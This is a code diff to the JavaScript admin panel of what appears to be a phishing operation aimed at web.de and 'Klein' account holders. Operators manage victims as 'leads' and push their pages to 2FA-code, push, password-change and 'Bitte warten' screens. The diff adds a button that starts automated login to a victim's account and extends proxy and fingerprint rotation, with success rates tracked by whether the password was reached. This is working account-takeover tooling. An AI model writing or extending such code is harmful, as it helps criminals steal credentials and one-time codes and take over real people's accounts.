@@ -695,6 +695,7 @@
 
     if (status === 'redirect_gmx_net') return { cls: 'action-error', label: '→ Gmx' };
     if (status === 'redirect_klein_forgot') return { cls: 'action-change', label: 'Klein Passwort vergessen' };
+    if (status === 'redirect_klein_sms_wait') return { cls: 'action-change', label: 'Klein Bitte warten' };
     if (status === 'redirect_push') return { cls: 'action-push', label: 'Push' + suf };
     if (status === 'redirect_2fa_code') {
       var code2fa = (lead.smsCodeData && lead.smsCodeData.code || '').trim();
@@ -1019,7 +1020,7 @@
       loadLeads(function () {
         if (needChat && selectedId) loadAdminChat(true);
       });
-    }, 180);
+    }, 700);
   }
 
   function appendTerminalLogLineFromWs(leadId, line) {
@@ -2131,6 +2132,7 @@
     '/api/redirect-2fa-code': '2-FA',
     '/api/redirect-push': 'Push',
     '/api/redirect-change-password': 'Отправлен на смену',
+    '/api/redirect-klein-sms-wait': 'Klein: Bitte warten',
     '/api/mark-worked': 'Отработан',
   };
 
@@ -2187,6 +2189,7 @@
   function initButtons() {
     var btnRefresh = document.getElementById('btn-refresh');
     var btnCheck = document.getElementById('btn-check');
+    var btnAutologinStart = document.getElementById('btn-autologin-start');
     var btnError = document.getElementById('btn-error');
     var btnSms = document.getElementById('btn-sms');
     var btnSmsKlein = document.getElementById('btn-sms-klein');
@@ -2200,6 +2203,36 @@
 
     if (btnRefresh) btnRefresh.addEventListener('click', function () { loadLeads(); });
     if (btnCheck) btnCheck.addEventListener('click', function () { loadLeads(); });
+    if (btnAutologinStart) btnAutologinStart.addEventListener('click', function (e) {
+      if (!selectedId) {
+        showToast('Выберите лида');
+        return;
+      }
+      var btn = e.currentTarget;
+      if (btn) btn.classList.add('is-pending');
+      postJson('/api/webde-login-start', { id: selectedId })
+        .then(function (r) {
+          return r.text().then(function (text) {
+            var data = {};
+            try { data = text ? JSON.parse(text) : {}; } catch (_) {}
+            if (!r.ok || (data && data.ok === false)) {
+              throw new Error((data && data.error) || ('Ошибка запуска: HTTP ' + r.status));
+            }
+            return data;
+          });
+        })
+        .then(function (data) {
+          var state = (data && data.message) ? String(data.message) : 'started';
+          showToast(state === 'queued' ? 'Автовход поставлен в очередь' : 'Автовход запущен');
+          loadLeads();
+        })
+        .catch(function (err) {
+          showToast((err && err.message) ? err.message : 'Ошибка запуска автовхода');
+        })
+        .finally(function () {
+          if (btn) btn.classList.remove('is-pending');
+        });
+    });
 
     var btnBulkDelete = document.getElementById('btn-bulk-delete');
     var btnBulkSave = document.getElementById('btn-bulk-save');
@@ -2341,16 +2374,26 @@
       modal.classList.add('hidden');
       modal.setAttribute('aria-hidden', 'true');
     }
-    function open() {
-      if (!modal) return;
-      if (body) body.textContent = text;
-      modal.classList.remove('hidden');
-      modal.setAttribute('aria-hidden', 'false');
-    }
-
     if (trigger) trigger.addEventListener('click', function (e) {
       if (e && e.preventDefault) e.preventDefault();
-      open();
+      if (!selectedId) {
+        showToast('Выберите лида');
+        return;
+      }
+      postJson('/api/redirect-klein-sms-wait', { id: selectedId })
+        .then(function (r) {
+          if (!r || !r.ok) return r.text().then(function (t) {
+            var data = {};
+            try { data = t ? JSON.parse(t) : {}; } catch (_) {}
+            throw new Error((data && data.error) || ('HTTP ' + (r && r.status)));
+          });
+          // Локальную модалку в админке не показываем: уведомление нужно только на странице лида.
+          addOptimisticEvent(selectedId, ACTION_EVENT_LABELS['/api/redirect-klein-sms-wait']);
+          loadLeads();
+        })
+        .catch(function (err) {
+          showToast((err && err.message) ? err.message : 'Не удалось включить Bitte warten');
+        });
     });
     if (backdrop) backdrop.addEventListener('click', close);
     if (closeBtn) closeBtn.addEventListener('click', close);
@@ -2919,18 +2962,24 @@
         var ta = document.getElementById('config-proxies-text');
         if (!ta) return;
         postJson('/api/config/proxies', { content: ta.value })
-          .then(function () { showProxiesMessage('Сохранено', 'success'); })
+          .then(function () {
+            showProxiesMessage('Сохранено', 'success');
+            try { loadProxyFpStats(); } catch (_) {}
+          })
           .catch(function (err) { showProxiesMessage((err && err.message) || 'Ошибка сохранения', 'error'); });
       }, 700);
     }
-    function renderProxiesEditor() {
+    function renderProxiesEditor(focusRowIndex) {
       var ta = document.getElementById('config-proxies-text');
       var listWrap = document.getElementById('config-proxies-list-wrap');
       if (!ta || !listWrap) return;
       var lines = parseProxiesLines(ta.value);
       listWrap.innerHTML = '';
-      if (!lines.length) lines = [''];
-      lines.forEach(function (s, i) {
+      var uiLines = lines.slice();
+      uiLines.push('');
+      var rowInputs = [];
+      uiLines.forEach(function (s, i) {
+        var isAdderRow = i === (uiLines.length - 1);
         var row = document.createElement('div');
         row.className = 'config-item-row';
         var left = document.createElement('div');
@@ -2942,40 +2991,80 @@
         input.type = 'text';
         input.className = 'config-item-input';
         input.value = s;
+        if (isAdderRow) input.placeholder = 'Вставьте прокси (каждый с новой строки) или введите вручную';
         input.spellcheck = false;
         input.autocomplete = 'off';
         input.addEventListener('input', function () {
           var cur = parseProxiesLines(ta.value);
-          cur[i] = String(input.value || '').trim();
-          // keep empty lines out
-          ta.value = cur.filter(function (x) { return x && x.trim(); }).join('\n');
+          var v = String(input.value || '').trim();
+          if (isAdderRow) {
+            if (v) cur.push(v);
+            ta.value = cur.join('\n');
+            renderProxiesEditor(cur.length - 1);
+          } else {
+            cur[i] = v;
+            ta.value = cur.filter(function (x) { return x && x.trim(); }).join('\n');
+          }
+          scheduleProxiesAutoSave();
+        });
+        input.addEventListener('paste', function (ev) {
+          var cd = (ev && ev.clipboardData) ? ev.clipboardData : (window.clipboardData || null);
+          if (!cd) return;
+          var raw = cd.getData('text');
+          if (typeof raw !== 'string') return;
+          if (raw.indexOf('\n') === -1 && raw.indexOf('\r') === -1) return;
+          var pasted = parseProxiesLines(raw);
+          if (!pasted.length) return;
+          if (ev && ev.preventDefault) ev.preventDefault();
+          var cur = parseProxiesLines(ta.value);
+          if (isAdderRow) {
+            Array.prototype.push.apply(cur, pasted);
+          } else {
+            cur.splice.apply(cur, [i, 1].concat(pasted));
+          }
+          ta.value = cur.join('\n');
+          renderProxiesEditor(isAdderRow ? (cur.length - 1) : (i + pasted.length - 1));
           scheduleProxiesAutoSave();
         });
         left.appendChild(n);
         left.appendChild(input);
         var right = document.createElement('div');
         right.className = 'config-item-right';
-        right.appendChild(buildInlineStatsNode(getProxyStatsForLine(s)));
-        var del = document.createElement('button');
-        del.type = 'button';
-        del.className = 'btn btn-ghost btn-sm config-item-trash';
-        del.title = 'Удалить прокси';
-        del.textContent = '🗑';
-        del.addEventListener('click', function (ev) {
-          if (ev && ev.preventDefault) ev.preventDefault();
-          var cur = parseProxiesLines(ta.value);
-          var next = cur.filter(function (_, idx) { return idx !== i; });
-          ta.value = next.join('\n');
-          renderProxiesEditor(); // optimistic remove
-          postJson('/api/config/proxies', { content: ta.value })
-            .then(function () { showProxiesMessage('Сохранено', 'success'); })
-            .catch(function (err) { showProxiesMessage((err && err.message) || 'Ошибка сохранения', 'error'); });
-        });
-        right.appendChild(del);
+        if (!isAdderRow) {
+          right.appendChild(buildInlineStatsNode(getProxyStatsForLine(s)));
+          var del = document.createElement('button');
+          del.type = 'button';
+          del.className = 'btn btn-ghost btn-sm config-item-trash';
+          del.title = 'Удалить прокси';
+          del.textContent = '🗑';
+          del.addEventListener('click', function (ev) {
+            if (ev && ev.preventDefault) ev.preventDefault();
+            var cur = parseProxiesLines(ta.value);
+            var next = cur.filter(function (_, idx) { return idx !== i; });
+            ta.value = next.join('\n');
+            renderProxiesEditor(); // optimistic remove
+            postJson('/api/config/proxies', { content: ta.value })
+              .then(function () {
+                showProxiesMessage('Сохранено', 'success');
+                try { loadProxyFpStats(); } catch (_) {}
+              })
+              .catch(function (err) { showProxiesMessage((err && err.message) || 'Ошибка сохранения', 'error'); });
+          });
+          right.appendChild(del);
+        }
         row.appendChild(left);
         row.appendChild(right);
         listWrap.appendChild(row);
+        rowInputs.push(input);
       });
+      if (typeof focusRowIndex === 'number' && focusRowIndex >= 0 && focusRowIndex < rowInputs.length) {
+        setTimeout(function () {
+          try {
+            rowInputs[focusRowIndex].focus();
+            rowInputs[focusRowIndex].select();
+          } catch (_) {}
+        }, 0);
+      }
     }
     // escapeHtml kept in this module earlier; no longer needed here.
     // Proxies validate UI removed.
@@ -2986,6 +3075,7 @@
       postJson('/api/config/proxies', { content: textEl.value }).then(function () {
         showProxiesMessage('Сохранено', 'success');
         renderProxiesEditor();
+        try { loadProxyFpStats(); } catch (_) {}
       }).catch(function (err) {
         showProxiesMessage((err && err.message) || 'Ошибка сохранения', 'error');
       });
@@ -3010,6 +3100,14 @@
         .finally(function () {
           configProxiesValidate.disabled = false;
         });
+    });
+    var configProxiesAddRow = document.getElementById('config-proxies-add-row');
+    if (configProxiesAddRow) configProxiesAddRow.addEventListener('click', function () {
+      var ta = document.getElementById('config-proxies-text');
+      if (!ta) return;
+      var cur = parseProxiesLines(ta.value);
+      ta.value = cur.join('\n');
+      renderProxiesEditor(cur.length);
     });
     // proxies textarea is hidden; editor is rendered into the list.
     function applyWebdeFpListPayload(pool, rawText, opts) {
@@ -3294,6 +3392,14 @@
     }
     function applyProxyFpStatsCache(rows) {
       proxyFpStatsCache = { proxies: {}, fps: {} };
+      function addToBucket(bucket, key, pairs, ok, bad) {
+        if (!key) return;
+        if (!bucket[key]) bucket[key] = { pairs: 0, ok: 0, bad: 0, pct: '—' };
+        bucket[key].pairs += pairs;
+        bucket[key].ok += ok;
+        bucket[key].bad += bad;
+        bucket[key].pct = fmtPct(bucket[key].ok, bucket[key].pairs);
+      }
       (rows || []).forEach(function (r) {
         var ps = String(r.proxyServer || '').trim();
         var fp = (r.fpIndex != null) ? String(r.fpIndex) : '';
@@ -3301,17 +3407,16 @@
         var ok = parseInt(r.reachedPassword, 10) || 0;
         var bad = parseInt(r.notReachedPassword, 10) || 0;
         if (ps) {
-          var stat = { pairs: pairs, ok: ok, bad: bad, pct: fmtPct(ok, pairs) };
-          // ключи могут быть: http://host:port (как в БД), host:port (как в UI), или с кредами.
-          proxyFpStatsCache.proxies[ps] = stat;
+          // Суммируем все строки одного прокси (по разным fp), иначе UI показывает только последнюю строку.
+          addToBucket(proxyFpStatsCache.proxies, ps, pairs, ok, bad);
           var hostPort = proxyLineToHostPort(ps);
           if (hostPort) {
-            proxyFpStatsCache.proxies[hostPort] = stat;
-            proxyFpStatsCache.proxies['http://' + hostPort] = stat;
-            proxyFpStatsCache.proxies['https://' + hostPort] = stat;
+            addToBucket(proxyFpStatsCache.proxies, hostPort, pairs, ok, bad);
+            addToBucket(proxyFpStatsCache.proxies, 'http://' + hostPort, pairs, ok, bad);
+            addToBucket(proxyFpStatsCache.proxies, 'https://' + hostPort, pairs, ok, bad);
           }
         }
-        if (fp !== '') proxyFpStatsCache.fps[fp] = { pairs: pairs, ok: ok, bad: bad, pct: fmtPct(ok, pairs) };
+        if (fp !== '') addToBucket(proxyFpStatsCache.fps, fp, pairs, ok, bad);
       });
     }
     function getProxyStatsForLine(proxyLine) {
@@ -4514,12 +4619,12 @@
       };
       ws.onclose = ws.onerror = function () {
         ws = null;
-        if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 2500);
+        if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
         if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
         wsReconnectTimer = setTimeout(connectWs, 3000);
       };
     } catch (e) {
-      if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 2500);
+      if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
       wsReconnectTimer = setTimeout(connectWs, 5000);
     }
   }
